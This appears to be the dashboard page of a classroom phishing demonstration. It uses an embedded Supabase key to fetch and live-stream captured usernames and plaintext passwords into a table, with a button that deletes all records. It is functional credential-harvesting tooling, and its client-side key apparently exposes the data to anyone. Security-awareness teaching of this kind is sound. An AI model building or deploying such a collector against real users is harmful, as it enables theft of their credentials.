<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phishing Demo - Dashboard</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700;900&display=swap">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: Roboto, sans-serif;
            background: #1a1a2e;
            color: #fff;
            min-height: 100vh;
        }

        .header {
            background: linear-gradient(135deg, #dc3545, #b71c1c);
            padding: 24px 40px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        }

        .header h1 {
            font-size: 42px;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 3px;
            margin-bottom: 4px;
        }

        .header p {
            font-size: 18px;
            opacity: 0.9;
        }

        .stats {
            display: flex;
            justify-content: center;
            gap: 40px;
            padding: 24px 40px;
            background: #16213e;
        }

        .stat-box {
            text-align: center;
        }

        .stat-number {
            font-size: 56px;
            font-weight: 900;
            color: #ffc107;
        }

        .stat-label {
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: #aaa;
        }

        .table-container {
            padding: 24px 40px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            background: #16213e;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
        }

        thead th {
            background: #0f3460;
            padding: 16px 24px;
            text-align: left;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: #aaa;
        }

        tbody tr {
            border-bottom: 1px solid #1a1a3e;
            animation: fadeIn 0.5s ease-in;
        }

        tbody tr:hover {
            background: #1a2745;
        }

        tbody td {
            padding: 14px 24px;
            font-size: 18px;
        }

        .col-num {
            width: 60px;
            color: #666;
            font-weight: 700;
        }

        .col-time {
            width: 100px;
            color: #888;
            font-size: 14px;
        }

        .col-user {
            color: #e0e0e0;
            font-weight: 700;
        }

        .col-pass {
            color: #ff6b6b;
            font-family: 'Courier New', monospace;
            font-weight: 700;
            font-size: 20px;
        }

        .empty-state {
            text-align: center;
            padding: 60px;
            color: #555;
            font-size: 18px;
        }

        .pulse {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #4caf50;
            border-radius: 50%;
            margin-right: 8px;
            animation: pulse 1.5s infinite;
        }

        .live-indicator {
            font-size: 13px;
            color: #4caf50;
            text-transform: uppercase;
            letter-spacing: 2px;
            padding: 12px 40px;
            display: flex;
            align-items: center;
        }

        .controls {
            padding: 12px 40px;
            display: flex;
            gap: 12px;
        }

        .btn {
            padding: 8px 20px;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
            font-family: Roboto, sans-serif;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .btn-clear {
            background: #333;
            color: #aaa;
        }

        .btn-clear:hover { background: #444; }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-8px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.3); }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>You've All Been Phished!</h1>
        <p>GENL114 — Classroom Phishing Demonstration</p>
    </div>

    <div class="stats">
        <div class="stat-box">
            <div class="stat-number" id="totalCount">0</div>
            <div class="stat-label">Credentials Captured</div>
        </div>
    </div>

    <div class="live-indicator">
        <span class="pulse"></span> Live — updates in real-time
    </div>

    <div class="table-container">
        <table>
            <thead>
                <tr>
                    <th>#</th>
                    <th>Time</th>
                    <th>Username</th>
                    <th>Password</th>
                </tr>
            </thead>
            <tbody id="tableBody">
                <tr class="empty-state-row">
                    <td colspan="4" class="empty-state">Waiting for submissions...</td>
                </tr>
            </tbody>
        </table>
    </div>

    <div class="controls">
        <button class="btn btn-clear" onclick="clearAll()">Clear All Data</button>
    </div>

    <script>
        var SUPABASE_URL = 'https://omrrknnkudkawxkhplao.supabase.co';
        var SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9tcnJrbm5rdWRrYXd4a2hwbGFvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMwMjczMDgsImV4cCI6MjA4ODYwMzMwOH0.8gbMXjn6rSiwCBjnp3YXkdkexPZAZDl4U8WD579ySEw';
        var submissions = [];

        // Load existing submissions
        fetch(SUPABASE_URL + '/rest/v1/submissions?select=*&order=created_at.asc', {
            headers: {
                'apikey': SUPABASE_KEY,
                'Authorization': 'Bearer ' + SUPABASE_KEY
            }
        })
        .then(function(r) { return r.json(); })
        .then(function(data) {
            submissions = data;
            renderTable();
        });

        // Subscribe to real-time inserts
        var ws = new WebSocket(
            SUPABASE_URL.replace('https://', 'wss://') + '/realtime/v1/websocket?apikey=' + SUPABASE_KEY + '&vsn=1.0.0'
        );

        ws.onopen = function() {
            // Join the realtime channel
            ws.send(JSON.stringify({
                topic: 'realtime:public:submissions',
                event: 'phx_join',
                payload: {
                    config: {
                        broadcast: { self: false },
                        postgres_changes: [
                            { event: 'INSERT', schema: 'public', table: 'submissions' }
                        ]
                    }
                },
                ref: '1'
            }));

            // Keep alive
            setInterval(function() {
                ws.send(JSON.stringify({
                    topic: 'phoenix',
                    event: 'heartbeat',
                    payload: {},
                    ref: '2'
                }));
            }, 30000);
        };

        ws.onmessage = function(event) {
            var msg = JSON.parse(event.data);
            if (msg.event === 'postgres_changes' || msg.event === 'INSERT') {
                var record = msg.payload && msg.payload.record;
                if (record && record.username) {
                    submissions.push(record);
                    renderTable();
                }
            }
        };

        // Fallback: poll every 5 seconds in case WebSocket misses something
        setInterval(function() {
            fetch(SUPABASE_URL + '/rest/v1/submissions?select=*&order=created_at.asc', {
                headers: {
                    'apikey': SUPABASE_KEY,
                    'Authorization': 'Bearer ' + SUPABASE_KEY
                }
            })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data.length !== submissions.length) {
                    submissions = data;
                    renderTable();
                }
            });
        }, 5000);

        function renderTable() {
            var tbody = document.getElementById('tableBody');
            document.getElementById('totalCount').textContent = submissions.length;

            if (submissions.length === 0) {
                tbody.innerHTML = '<tr class="empty-state-row"><td colspan="4" class="empty-state">Waiting for submissions...</td></tr>';
                return;
            }

            tbody.innerHTML = '';
            for (var i = 0; i < submissions.length; i++) {
                var s = submissions[i];
                var time = new Date(s.created_at).toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
                var tr = document.createElement('tr');
                tr.innerHTML =
                    '<td class="col-num">' + (i + 1) + '</td>' +
                    '<td class="col-time">' + time + '</td>' +
                    '<td class="col-user">' + escapeHtml(s.username) + '</td>' +
                    '<td class="col-pass">' + escapeHtml(s.password) + '</td>';
                tbody.appendChild(tr);
            }
        }

        function escapeHtml(str) {
            var div = document.createElement('div');
            div.textContent = str;
            return div.innerHTML;
        }

        function clearAll() {
            if (!confirm('Delete all captured submissions? This cannot be undone.')) return;
            fetch(SUPABASE_URL + '/rest/v1/submissions?id=gt.0', {
                method: 'DELETE',
                headers: {
                    'apikey': SUPABASE_KEY,
                    'Authorization': 'Bearer ' + SUPABASE_KEY
                }
            }).then(function() {
                submissions = [];
                renderTable();
            });
        }
    </script>
</body>
</html>
